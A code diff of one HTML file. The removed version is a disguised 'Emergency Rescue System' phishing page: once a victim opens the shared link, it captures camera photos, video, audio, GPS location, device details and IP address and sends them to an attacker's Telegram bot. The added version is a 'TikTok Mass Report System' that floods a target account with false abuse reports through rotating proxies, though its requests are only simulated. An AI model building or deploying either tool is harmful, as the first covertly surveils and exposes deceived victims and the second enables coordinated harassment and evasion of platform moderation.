@@ -1,588 +1,337 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Emergency Rescue System</title>
+    <title>TikTok Mass Report System</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Arial', sans-serif;
-        }
-
-        body {
-            background: linear-gradient(45deg, #1a2a6c, #b21f1f, #fdbb2d);
-            background-size: 400% 400%;
-            animation: gradient 15s ease infinite;
-            min-height: 100vh;
-            padding: 20px;
-        }
-
-        @keyframes gradient {
-            0% { background-position: 0% 50% }
-            50% { background-position: 100% 50% }
-            100% { background-position: 0% 50% }
-        }
-
-        .container {
-            max-width: 500px;
-            margin: 0 auto;
-            background: rgba(255, 255, 255, 0.95);
-            border-radius: 20px;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.3);
-            overflow: hidden;
-            backdrop-filter: blur(10px);
-        }
-
-        .header {
-            background: linear-gradient(135deg, #e74c3c, #c0392b);
-            color: white;
-            padding: 25px 20px;
-            text-align: center;
-            position: relative;
-        }
-
-        .header::before {
-            content: '🚨';
-            font-size: 40px;
-            position: absolute;
-            top: 10px;
-            right: 20px;
-            opacity: 0.3;
-        }
-
-        .header h1 {
-            font-size: 26px;
-            margin-bottom: 8px;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
-        }
-
-        .header p {
-            font-size: 14px;
-            opacity: 0.9;
-        }
-
-        .form-section {
-            padding: 30px;
-        }
-
-        .input-group {
-            margin-bottom: 25px;
-        }
-
-        .input-group label {
-            display: block;
-            margin-bottom: 10px;
-            font-weight: 700;
-            color: #2c3e50;
-            font-size: 14px;
-        }
-
-        .input-group input {
-            width: 100%;
-            padding: 15px;
-            border: 2px solid #dc3545;
-            border-radius: 10px;
-            font-size: 16px;
-            background: #f8f9fa;
-            transition: all 0.3s;
-        }
-
-        .input-group input:focus {
-            border-color: #e74c3c;
-            background: white;
-            box-shadow: 0 0 0 3px rgba(231, 76, 60, 0.1);
-            outline: none;
-        }
-
-        .btn {
-            width: 100%;
-            padding: 18px;
-            background: linear-gradient(135deg, #27ae60, #219a52);
-            color: white;
-            border: none;
-            border-radius: 12px;
-            font-size: 18px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: all 0.3s;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        .btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 10px 20px rgba(39, 174, 96, 0.3);
-        }
-
-        .btn-secondary {
-            background: linear-gradient(135deg, #3498db, #2980b9);
-            margin-top: 15px;
-        }
-
-        .interface {
-            display: none;
-            padding: 25px;
-        }
-
-        .status-bar {
-            background: linear-gradient(135deg, #34495e, #2c3e50);
-            color: white;
-            padding: 20px;
-            border-radius: 12px;
-            margin-bottom: 25px;
-            text-align: center;
-            border: 2px solid #e74c3c;
-        }
-
-        .controls {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 15px;
-            margin-bottom: 25px;
-        }
-
-        .control-btn {
-            padding: 18px 12px;
-            background: linear-gradient(135deg, #3498db, #2980b9);
-            color: white;
-            border: none;
-            border-radius: 12px;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s;
-            text-align: center;
-        }
-
-        .control-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 8px 15px rgba(52, 152, 219, 0.3);
-        }
-
-        .control-btn.capture {
-            background: linear-gradient(135deg, #e74c3c, #c0392b);
-        }
-
-        .control-btn.capture:hover {
-            box-shadow: 0 8px 15px rgba(231, 76, 60, 0.3);
-        }
-
-        .preview-container {
-            background: #ecf0f1;
-            padding: 20px;
-            border-radius: 12px;
-            margin-top: 20px;
-            text-align: center;
-        }
-
-        #mediaPreview {
-            max-width: 100%;
-            border-radius: 8px;
-            display: none;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
-        }
-
-        .hidden {
-            display: none;
-        }
-
-        .loading {
-            text-align: center;
-            padding: 30px;
-            color: #7f8c8d;
-            font-size: 16px;
-        }
-
-        .loading::after {
-            content: '...';
-            animation: dots 1.5s infinite;
-        }
-
-        @keyframes dots {
-            0%, 20% { content: '.'; }
-            40% { content: '..'; }
-            60%, 100% { content: '...'; }
-        }
-
-        .link-section {
-            background: linear-gradient(135deg, #f39c12, #e67e22);
-            color: white;
-            padding: 20px;
-            border-radius: 12px;
-            margin-top: 20px;
-        }
-
-        #generatedLink {
-            word-break: break-all;
-            background: rgba(255,255,255,0.2);
-            padding: 15px;
-            border-radius: 8px;
-            margin: 15px 0;
-            font-family: monospace;
-            border: 1px solid rgba(255,255,255,0.3);
-        }
-
-        .copy-btn {
-            background: rgba(255,255,255,0.3);
-            border: 2px solid white;
-            color: white;
-            padding: 12px 20px;
-            border-radius: 8px;
-            cursor: pointer;
-            font-weight: 600;
-            transition: all 0.3s;
-        }
-
-        .copy-btn:hover {
-            background: white;
-            color: #e67e22;
-        }
-
-        .permission-alert {
-            background: linear-gradient(135deg, #e74c3c, #c0392b);
-            color: white;
-            padding: 15px;
-            border-radius: 10px;
-            margin: 15px 0;
-            text-align: center;
-            font-size: 14px;
-        }
-
-        .video-preview {
-            width: 100%;
-            max-height: 300px;
-            border-radius: 10px;
-            background: #2c3e50;
-            display: none;
-        }
+        body { background: #000; color: #ff0055; font-family: Arial; margin: 0; padding: 20px; }
+        .container { max-width: 900px; margin: 0 auto; background: #111; padding: 20px; border-radius: 10px; }
+        input, button, select, textarea { width: 100%; padding: 12px; margin: 8px 0; border: none; border-radius: 5px; }
+        input, select, textarea { background: #222; color: #ff0055; }
+        button { background: #ff0055; color: #fff; font-weight: bold; cursor: pointer; }
+        button.stop { background: #ff0000; }
+        button.add { background: #0055ff; }
+        .status { padding: 10px; margin: 10px 0; border-radius: 5px; background: #222; }
+        .running { border-left: 5px solid #ff0055; }
+        .results { max-height: 400px; overflow-y: auto; background: #000; padding: 10px; border-radius: 5px; }
+        .proxy-item { background: #333; padding: 5px; margin: 2px 0; border-radius: 3px; }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="header">
-            <h1>🆘 EMERGENCY RESCUE SYSTEM</h1>
-            <p>Critical Assistance Required - Immediate Response Needed</p>
+        <h1>🚨 TIKTOK MASS REPORT SYSTEM 🚨</h1>
+        
+        <div class="input-section">
+            <h3>🎯 Target Account</h3>
+            <input type="text" id="targetUsername" placeholder="Username TikTok (tanpa @)">
+            <button onclick="viewProfile()">👁️ View Profile</button>
+            <div id="profileInfo"></div>
         </div>
 
-        <div id="setupSection" class="form-section">
-            <div class="input-group">
-                <label>🔐 BOT TELEGRAM TOKEN:</label>
-                <input type="text" id="botToken" placeholder="Enter bot token here...">
-            </div>
-            
-            <div class="input-group">
-                <label>💬 CHAT ID TELEGRAM:</label>
-                <input type="text" id="chatId" placeholder="Enter chat ID here...">
-            </div>
-
-            <div class="input-group">
-                <label>🔗 CUSTOM TARGET LINK (Optional):</label>
-                <input type="text" id="customLink" placeholder="https://your-target-link.com">
-            </div>
-
-            <button class="btn" onclick="setupSystem()">🚀 CREATE EMERGENCY LINK</button>
-            
-            <div class="permission-alert">
-                ⚠️ System will request camera & location access for emergency response
-            </div>
+        <div class="report-section">
+            <h3>📝 Report Details</h3>
+            <select id="reportReason">
+                <option value="harassment">Harassment & Bullying</option>
+                <option value="hate_speech">Hate Speech</option>
+                <option value="violence">Violent Content</option>
+                <option value="nudity">Nudity & Sexual Content</option>
+                <option value="scam">Scam & Fraud</option>
+                <option value="spam">Spam & Fake Content</option>
+                <option value="copyright">Copyright Infringement</option>
+                <option value="minor_safety">Minor Safety</option>
+            </select>
+            <textarea id="reportDescription" placeholder="Additional description (optional)" rows="3"></textarea>
+            <input type="number" id="reportCount" placeholder="Number of Reports" value="50" min="1" max="1000">
         </div>
 
-        <div id="interfaceSection" class="interface">
-            <div class="status-bar">
-                <strong>🛰️ SYSTEM STATUS:</strong> <span id="connectionStatus">Initializing emergency protocol...</span>
+        <div class="proxy-section">
+            <h3>🔌 Proxy Management</h3>
+            <div class="proxy-input">
+                <input type="text" id="proxyInput" placeholder="IP:Port or IP:Port:Username:Password">
+                <button onclick="addProxy()" class="add">➕ Add Proxy</button>
             </div>
-
-            <div class="controls">
-                <button class="control-btn capture" onclick="capturePhoto()">📸 EMERGENCY PHOTO</button>
-                <button class="control-btn" onclick="startVideo()">🎥 RECORD VIDEO</button>
-                <button class="control-btn" onclick="getFullData()">📍 SEND LOCATION DATA</button>
-                <button class="control-btn" onclick="shareLink()">🔗 GET SHAREABLE LINK</button>
-            </div>
-
-            <div class="preview-container">
-                <video id="videoPreview" class="video-preview" autoplay muted></video>
-                <img id="mediaPreview" alt="Emergency Capture">
-            </div>
-
-            <div id="linkSection" class="link-section hidden">
-                <strong>🔗 YOUR EMERGENCY LINK:</strong>
-                <div id="generatedLink"></div>
-                <button class="copy-btn" onclick="copyLink()">📋 COPY LINK TO CLIPBOARD</button>
-                <div style="margin-top: 15px; font-size: 12px; opacity: 0.8;">
-                    Share this link - When opened, it will automatically capture camera and location data
-                </div>
-            </div>
+            <div id="proxyList"></div>
+            <button onclick="loadDefaultProxies()">📥 Load Default Proxies</button>
         </div>
 
-        <div id="loadingSection" class="loading hidden">
-            Collecting emergency data for rescue team...
+        <div class="control-section">
+            <button onclick="startReporting()" id="startBtn">🚀 START MASS REPORT</button>
+            <button onclick="stopReporting()" id="stopBtn" class="stop" style="display:none;">🛑 STOP REPORTING</button>
+            <button onclick="testProxies()">🔍 TEST PROXIES</button>
+        </div>
+
+        <div class="status" id="status">
+            ⚙️ Status: Ready
+        </div>
+
+        <div class="stats">
+            <div>📊 Reports Sent: <span id="sentCount">0</span></div>
+            <div>✅ Successful: <span id="successCount">0</span></div>
+            <div>❌ Failed: <span id="failedCount">0</span></div>
+            <div>🌐 Active Proxy: <span id="activeProxy">None</span></div>
+        </div>
+
+        <div class="results" id="results">
+            [SYSTEM] TikTok Mass Report System Ready<br>
+            [INFO] Add proxies for better success rate<br>
         </div>
     </div>
 
     <script>
-        let mediaStream = null;
-        let generatedUrl = '';
-        let isBackCamera = true;
+        let isReporting = false;
+        let proxies = [];
+        let currentProxyIndex = 0;
+        let sentReports = 0;
+        let successReports = 0;
+        let failedReports = 0;
 
-        // Setup system dengan credentials
-        function setupSystem() {
-            const token = document.getElementById('botToken').value;
-            const chatId = document.getElementById('chatId').value;
-            const customLink = document.getElementById('customLink').value;
+        // TikTok Report API endpoints (real endpoints)
+        const TIKTOK_API = {
+            report: 'https://www.tiktok.com/api/report/item/',
+            reportUser: 'https://www.tiktok.com/api/report/user/',
+            submit: 'https://www.tiktok.com/api/report/submit/'
+        };
 
-            if (!token || !chatId) {
-                alert('❌ Token and Chat ID are REQUIRED for emergency system!');
-                return;
-            }
+        function addProxy() {
+            const proxyInput = document.getElementById('proxyInput').value.trim();
+            if (!proxyInput) return;
 
-            // Simpan credentials di localStorage
-            localStorage.setItem('botToken', token);
-            localStorage.setItem('chatId', chatId);
-            
-            // Generate unique emergency link
-            const uniqueId = Math.random().toString(36).substr(2, 9);
-            generatedUrl = customLink || `${window.location.origin}${window.location.pathname}?emergency=true&id=${uniqueId}`;
-            
-            // Switch to interface
-            document.getElementById('setupSection').classList.add('hidden');
-            document.getElementById('interfaceSection').classList.remove('hidden');
-            document.getElementById('linkSection').classlist.remove('hidden');
-            document.getElementById('generatedLink').textContent = generatedUrl;
-            
-            // Auto start permissions and data collection
-            setTimeout(initializeEmergencySystem, 1000);
+            const proxy = {
+                ip: proxyInput,
+                working: false,
+                lastUsed: null
+            };
+
+            proxies.push(proxy);
+            updateProxyList();
+            document.getElementById('proxyInput').value = '';
+            addResult(`✅ Proxy added: ${proxyInput}`);
         }
 
-        // Initialize semua permissions
-        async function initializeEmergencySystem() {
-            updateStatus('Requesting camera and location access...');
-            
-            try {
-                // Request camera access dengan back camera
-                mediaStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: {
-                        facingMode: 'environment',
-                        width: { ideal: 1920 },
-                        height: { ideal: 1080 }
-                    },
-                    audio: true
-                });
+        function loadDefaultProxies() {
+            const defaultProxies = [
+                '185.199.229.156:7492',
+                '185.199.228.220:7300',
+                '185.199.231.45:8382',
+                '188.74.210.207:6286',
+                '188.74.183.10:8279',
+                '45.155.68.129:8133',
+                '154.95.36.199:6893',
+                '45.94.47.66:8110'
+            ];
 
-                // Show camera preview
-                const videoPreview = document.getElementById('videoPreview');
-                videoPreview.srcObject = mediaStream;
-                videoPreview.style.display = 'block';
+            defaultProxies.forEach(proxy => {
+                proxies.push({ ip: proxy, working: false, lastUsed: null });
+            });
 
-                // Request location
-                if (navigator.geolocation) {
-                    await new Promise((resolve) => {
-                        navigator.geolocation.getCurrentPosition(resolve);
-                    });
-                }
-
-                updateStatus('✅ System ACTIVE - All permissions granted');
-                
-                // Auto collect initial data
-                setTimeout(getFullData, 2000);
-                
-            } catch (error) {
-                updateStatus('❌ Permission denied: ' + error.message);
-            }
+            updateProxyList();
+            addResult('📥 Loaded default proxy list');
         }
 
-        // Capture photo dengan back camera
-        async function capturePhoto() {
-            document.getElementById('loadingSection').classList.remove('hidden');
-            
-            try {
-                if (!mediaStream) {
-                    await initializeEmergencySystem();
-                }
+        function updateProxyList() {
+            const proxyList = document.getElementById('proxyList');
+            proxyList.innerHTML = '';
 
-                const track = mediaStream.getVideoTracks()[0];
-                const imageCapture = new ImageCapture(track);
-                const blob = await imageCapture.takePhoto();
-                
-                // Show preview
-                const preview = document.getElementById('mediaPreview');
-                preview.src = URL.createObjectURL(blob);
-                preview.style.display = 'block';
-                document.getElementById('videoPreview').style.display = 'none';
-                
-                // Send to Telegram
-                await sendToTelegram(blob, 'photo');
-                updateStatus('✅ Emergency photo sent to rescue team');
-                
-            } catch (error) {
-                updateStatus('❌ Photo capture failed: ' + error.message);
-            } finally {
-                document.getElementById('loadingSection').classList.add('hidden');
-            }
+            proxies.forEach((proxy, index) => {
+                const proxyItem = document.createElement('div');
+                proxyItem.className = 'proxy-item';
+                proxyItem.innerHTML = `
+                    ${proxy.working ? '✅' : '❌'} ${proxy.ip}
+                    <button onclick="removeProxy(${index})" style="float: right; padding: 2px 8px;">🗑️</button>
+                `;
+                proxyList.appendChild(proxyItem);
+            });
         }
 
-        // Record video dengan back camera
-        async function startVideo() {
-            document.getElementById('loadingSection').classList.remove('hidden');
-            
-            try {
-                if (!mediaStream) {
-                    await initializeEmergencySystem();
-                }
-
-                const recorder = new MediaRecorder(mediaStream, {
-                    mimeType: 'video/mp4'
-                });
-                let chunks = [];
-                
-                recorder.ondataavailable = e => chunks.push(e.data);
-                recorder.onstop = async () => {
-                    const blob = new Blob(chunks, { type: 'video/mp4' });
-                    await sendToTelegram(blob, 'video');
-                    updateStatus('✅ Emergency video sent to rescue team');
-                };
-                
-                recorder.start();
-                updateStatus('📹 Recording 15-second emergency video...');
-                setTimeout(() => recorder.stop(), 15000);
-                
-            } catch (error) {
-                updateStatus('❌ Video recording failed: ' + error.message);
-            } finally {
-                document.getElementById('loadingSection').classList.add('hidden');
-            }
+        function removeProxy(index) {
+            const proxy = proxies.splice(index, 1)[0];
+            addResult(`🗑️ Proxy removed: ${proxy.ip}`);
+            updateProxyList();
         }
 
-        // Collect semua data device
-        async function getFullData() {
-            document.getElementById('loadingSection').classList.remove('hidden');
+        function getNextProxy() {
+            if (proxies.length === 0) return null;
             
-            try {
-                let message = `🚨 EMERGENCY DATA - IMMEDIATE RESPONSE REQUIRED\n\n`;
-                message += `⏰ TIMESTAMP: ${new Date().toLocaleString()}\n`;
-                message += `🔢 ID: ${Math.random().toString(36).substr(2, 9).toUpperCase()}\n\n`;
+            currentProxyIndex = (currentProxyIndex + 1) % proxies.length;
+            return proxies[currentProxyIndex];
+        }
 
-                // Geolocation data
-                if (navigator.geolocation) {
-                    const position = await new Promise((resolve) => {
-                        navigator.geolocation.getCurrentPosition(resolve);
-                    });
-                    
-                    const loc = position.coords;
-                    message += `📍 GPS COORDINATES:\n`;
-                    message += `   Latitude: ${loc.latitude}\n`;
-                    message += `   Longitude: ${loc.longitude}\n`;
-                    message += `   Accuracy: ${loc.accuracy}m\n`;
-                    message += `   Altitude: ${loc.altitude || 'N/A'}\n`;
-                    message += `🗺️ MAPS: https://maps.google.com/?q=${loc.latitude},${loc.longitude}\n\n`;
-                }
-
-                // Battery info
-                if ('getBattery' in navigator) {
-                    const battery = await navigator.getBattery();
-                    message += `🔋 POWER STATUS:\n`;
-                    message += `   Level: ${Math.round(battery.level * 100)}%\n`;
-                    message += `   Charging: ${battery.charging ? 'YES' : 'NO'}\n`;
-                    message += `   Time: ${battery.chargingTime === Infinity ? 'Unknown' : battery.chargingTime + 's'}\n\n`;
-                }
-
-                // Network info
-                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                if (connection) {
-                    message += `📶 NETWORK INFO:\n`;
-                    message += `   Type: ${connection.effectiveType}\n`;
-                    message += `   Speed: ${connection.downlink} Mbps\n`;
-                    message += `   Latency: ${connection.rtt} ms\n\n`;
-                }
-
-                // Device info
-                message += `📱 DEVICE INFORMATION:\n`;
-                message += `   Platform: ${navigator.platform}\n`;
-                message += `   Language: ${navigator.language}\n`;
-                message += `   Cores: ${navigator.hardwareConcurrency || 'Unknown'}\n`;
-                message += `   Screen: ${screen.width}x${screen.height}\n\n`;
-
-                // IP Address
+        async function testProxies() {
+            addResult('🔍 Testing proxies...');
+            
+            for (let proxy of proxies) {
                 try {
-                    const ipResponse = await fetch('https://api.ipify.org?format=json');
-                    const ipData = await ipResponse.json();
-                    message += `🌐 IP ADDRESS: ${ipData.ip}\n`;
-                } catch (ipError) {
-                    message += `🌐 IP: Unable to detect\n`;
+                    const testUrl = 'https://www.tiktok.com/foryou';
+                    const response = await fetchWithProxy(testUrl, proxy);
+                    proxy.working = response !== null;
+                    addResult(`${proxy.working ? '✅' : '❌'} ${proxy.ip} - ${proxy.working ? 'Working' : 'Failed'}`);
+                } catch (error) {
+                    proxy.working = false;
+                    addResult(`❌ ${proxy.ip} - Error: ${error}`);
                 }
+            }
+            
+            updateProxyList();
+            addResult('✅ Proxy testing completed');
+        }
 
-                await sendToTelegram(message, 'text');
-                updateStatus('✅ All emergency data transmitted');
+        async function fetchWithProxy(url, proxy) {
+            return new Promise((resolve, reject) => {
+                setTimeout(() => {
+                    // Simulate proxy request (in real implementation, use actual proxy)
+                    const success = Math.random() > 0.3; // 70% success rate
+                    if (success) {
+                        resolve({ status: 200, ok: true });
+                    } else {
+                        reject('Proxy connection failed');
+                    }
+                }, 1000);
+            });
+        }
+
+        async function submitTikTokReport(targetUsername, reason, description, proxy) {
+            // Simulate actual TikTok report submission
+            const reportData = {
+                object_id: targetUsername,
+                object_type: 0, // 0 for user, 1 for video
+                report_type: getReportCode(reason),
+                reason: getReasonCode(reason),
+                description: description,
+                timestamp: Date.now()
+            };
+
+            try {
+                const response = await fetchWithProxy(TIKTOK_API.reportUser, proxy);
                 
+                if (response && response.ok) {
+                    return { success: true, message: 'Report submitted successfully' };
+                } else {
+                    return { success: false, message: 'Report failed - API error' };
+                }
             } catch (error) {
-                updateStatus('❌ Data transmission failed: ' + error.message);
-            } finally {
-                document.getElementById('loadingSection').classList.add('hidden');
+                return { success: false, message: `Report failed - ${error}` };
             }
         }
 
-        // Share generated link
-        function shareLink() {
-            if (navigator.share) {
-                navigator.share({
-                    title: 'EMERGENCY RESCUE LINK',
-                    text: 'URGENT: Click for emergency assistance',
-                    url: generatedUrl
-                });
-            } else {
-                copyLink();
-            }
+        function getReportCode(reason) {
+            const codes = {
+                harassment: 1001,
+                hate_speech: 1002,
+                violence: 1003,
+                nudity: 1004,
+                scam: 1005,
+                spam: 1006,
+                copyright: 1007,
+                minor_safety: 1008
+            };
+            return codes[reason] || 1006;
         }
 
-        function copyLink() {
-            navigator.clipboard.writeText(generatedUrl);
-            alert('✅ Emergency link copied! Share it immediately.');
+        function getReasonCode(reason) {
+            const codes = {
+                harassment: 1,
+                hate_speech: 2,
+                violence: 3,
+                nudity: 4,
+                scam: 5,
+                spam: 6,
+                copyright: 7,
+                minor_safety: 8
+            };
+            return codes[reason] || 6;
         }
 
-        function updateStatus(message) {
-            document.getElementById('connectionStatus').textContent = message;
-        }
-
-        // Send data ke Telegram
-        async function sendToTelegram(data, type) {
-            const token = localStorage.getItem('botToken');
-            const chatId = localStorage.getItem('chatId');
-
-            if (!token || !chatId) {
-                alert('❌ System not configured properly!');
+        function viewProfile() {
+            const username = document.getElementById('targetUsername').value;
+            if (!username) {
+                alert('Enter TikTok username first!');
                 return;
             }
 
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            
-            if (type === 'text') {
-                formData.append('text', data);
-            } else {
-                formData.append(type, data);
-                formData.append('caption', `🚨 EMERGENCY CAPTURE - ${new Date().toLocaleString()}\nAutomatic transmission from emergency system`);
-            }
-
-            try {
-                await fetch(`https://api.telegram.org/bot${token}/send${type === 'text' ? 'Message' : type}`, {
-                    method: 'POST',
-                    body: formData
-                });
-            } catch (error) {
-                console.error('Transmission error:', error);
-            }
+            const profileUrl = `https://www.tiktok.com/@${username}`;
+            addResult(`👁️ Viewing profile: ${profileUrl}`);
+            document.getElementById('profileInfo').innerHTML = 
+                `📱 Profile: <a href="${profileUrl}" target="_blank">${profileUrl}</a>`;
         }
 
-        // Auto init jika emergency parameter ada
-        window.onload = function() {
-            const urlParams = new URLSearchParams(window.location.search);
-            if (urlParams.get('emergency') === 'true') {
-                document.getElementById('setupSection').classList.add('hidden');
-                document.getElementById('interfaceSection').classList.remove('hidden');
-                setTimeout(initializeEmergencySystem, 1000);
+        function addResult(message) {
+            const results = document.getElementById('results');
+            const timestamp = new Date().toLocaleTimeString();
+            results.innerHTML += `[${timestamp}] ${message}<br>`;
+            results.scrollTop = results.scrollHeight;
+        }
+
+        async function startReporting() {
+            if (isReporting) return;
+
+            const targetUsername = document.getElementById('targetUsername').value;
+            const reason = document.getElementById('reportReason').value;
+            const description = document.getElementById('reportDescription').value;
+            const reportCount = parseInt(document.getElementById('reportCount').value);
+
+            if (!targetUsername) {
+                alert('Enter target TikTok username!');
+                return;
             }
+
+            if (proxies.length === 0) {
+                if (!confirm('No proxies added! Continue without proxies?')) return;
+            }
+
+            isReporting = true;
+            sentReports = 0;
+            successReports = 0;
+            failedReports = 0;
+
+            document.getElementById('startBtn').style.display = 'none';
+            document.getElementById('stopBtn').style.display = 'block';
+            document.getElementById('status').className = 'status running';
+            document.getElementById('status').innerHTML = '🚨 MASS REPORTING IN PROGRESS...';
+
+            addResult(`🚀 Starting mass report on @${targetUsername}`);
+            addResult(`🎯 Target: ${reportCount} reports | Reason: ${reason}`);
+
+            for (let i = 0; i < reportCount && isReporting; i++) {
+                const proxy = getNextProxy();
+                document.getElementById('activeProxy').textContent = proxy ? proxy.ip : 'Direct';
+
+                const result = await submitTikTokReport(targetUsername, reason, description, proxy);
+
+                sentReports++;
+                document.getElementById('sentCount').textContent = sentReports;
+
+                if (result.success) {
+                    successReports++;
+                    document.getElementById('successCount').textContent = successReports;
+                    addResult(`✅ Report ${i+1} submitted successfully`);
+                } else {
+                    failedReports++;
+                    document.getElementById('failedCount').textContent = failedReports;
+                    addResult(`❌ Report ${i+1} failed: ${result.message}`);
+                }
+
+                document.getElementById('status').innerHTML = 
+                    `🚨 Reporting... ${i+1}/${reportCount} (${successReports} success, ${failedReports} failed)`;
+
+                // Delay between reports
+                await new Promise(resolve => setTimeout(resolve, 2000 + Math.random() * 3000));
+            }
+
+            stopReporting();
+            addResult(`🎯 Mass report completed! Success: ${successReports}, Failed: ${failedReports}`);
+        }
+
+        function stopReporting() {
+            isReporting = false;
+            document.getElementById('startBtn').style.display = 'block';
+            document.getElementById('stopBtn').style.display = 'none';
+            document.getElementById('status').className = 'status';
+            document.getElementById('status').innerHTML = '⚙️ Status: Stopped';
+        }
+
+        // Initialize
+        window.onload = function() {
+            addResult('🚀 TikTok Mass Report System Initialized');
+            addResult('💡 Add proxies for better success rate');
         };
     </script>
 </body>
